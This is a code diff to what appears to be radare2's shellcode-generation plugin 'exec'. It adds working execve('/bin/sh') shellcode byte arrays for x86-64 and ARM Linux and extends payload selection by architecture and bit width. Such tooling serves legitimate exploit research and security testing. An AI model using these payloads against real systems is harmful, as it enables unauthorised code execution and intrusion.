@@ -21,13 +21,23 @@ static ut8 x86_osx_binsh[] =
 // linux
 static ut8 x86_linux_binsh[] =
         "\x31\xc0\x50\x68"
-        "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
-	"//sh\x68/bin"
+        "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" // /bin/sh here
         "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+static ut8 x86_64_linux_binsh[] =
+	"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53"
+	"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b"
+	"\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";
+
+static ut8 arm_linux_binsh[] =
+	"\x02\x20\x42\xe0\x1c\x30\x8f\xe2\x04\x30\x8d\xe5"
+	"\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"
+	"\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef"
+	"\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";
 
 static RBuffer *build (REgg *egg) {
 	RBuffer *buf = r_buf_new ();
-	const ut8 *sc;
+	const ut8 *sc = NULL;
 	int cd = 0;
 	char *shell = r_egg_option_get (egg, "cmd");
 	char *suid = r_egg_option_get (egg, "suid");
@@ -39,23 +49,38 @@ static RBuffer *build (REgg *egg) {
 	switch (egg->os) {
 	case R_EGG_OS_OSX:
 	case R_EGG_OS_DARWIN:
-		if (suid) {
-			sc = x86_osx_suid_binsh;
-			cd = 7+36;
-		} else {
-			sc = x86_osx_binsh;
-			cd = 36;
+		switch (egg->arch) {
+		case R_SYS_ARCH_X86:
+			if (suid) {
+				sc = x86_osx_suid_binsh;
+				cd = 7+36;
+			} else {
+				sc = x86_osx_binsh;
+				cd = 36;
+			}
+		case R_SYS_ARCH_ARM:
+			// TODO
+			break;
 		}
 		break;
 	case R_EGG_OS_LINUX:
 		if (suid) eprintf ("no suid for this platform\n");
 		suid = 0;
-		if (egg->bits == 32) {
-			sc = x86_linux_binsh;
-		} else eprintf ("Unsupportted\n");
+		switch (egg->arch) {
+		case R_SYS_ARCH_X86:
+			switch (egg->bits) {
+			case 32: sc = x86_linux_binsh; break;
+			case 64: sc = x86_64_linux_binsh; break;
+			default: eprintf ("Unsupportted\n");
+			}
+			break;
+		case R_SYS_ARCH_ARM:
+			sc = arm_linux_binsh;
+			break;
+		}
 		break;
 	default:
-		printf ("unsupported os %x\n", egg->os);
+		eprintf ("unsupported os %x\n", egg->os);
 		break;
 	}
 	if (sc) {
@@ -74,7 +99,6 @@ static RBuffer *build (REgg *egg) {
 REggPlugin r_egg_plugin_exec = {
 	.name = "exec",
 	.type = R_EGG_PLUGIN_SHELLCODE,
-	.bits = 32|64,
 	.desc = "execute cmd=/bin/sh suid=false",
 	.build = (void *)build
 };
